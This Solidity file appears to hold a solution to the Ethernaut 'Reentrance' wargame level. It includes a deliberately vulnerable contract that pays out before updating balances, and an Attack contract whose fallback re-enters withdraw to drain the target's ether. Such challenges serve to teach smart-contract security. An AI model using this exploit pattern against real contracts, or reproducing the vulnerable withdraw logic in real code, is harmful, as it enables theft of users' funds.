// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}


/**
 The goal of this level is for you to steal all the funds from the contract.
  Things that might help:
    Untrusted contracts can execute code where you least expect it.
    Fallback methods
    Throw/revert bubbling
    Sometimes the best way to attack a contract is with another contract.
    See the Help page above, section "Beyond the console" 
 */
contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


contract Attack{

    Reentrance public taget;
     
    constructor(address payable _addr) public payable {
        taget = Reentrance(_addr);
    }

    function withdrawAll() public payable{
      taget.donate{value: msg.value}(address(this));
      taget.withdraw(msg.value);    
    }

    fallback() external payable{
      if(address(taget).balance >= 0){
         taget.withdraw(msg.value);
      }
    }

    function destroy() public{
      selfdestruct(msg.sender);
    }
}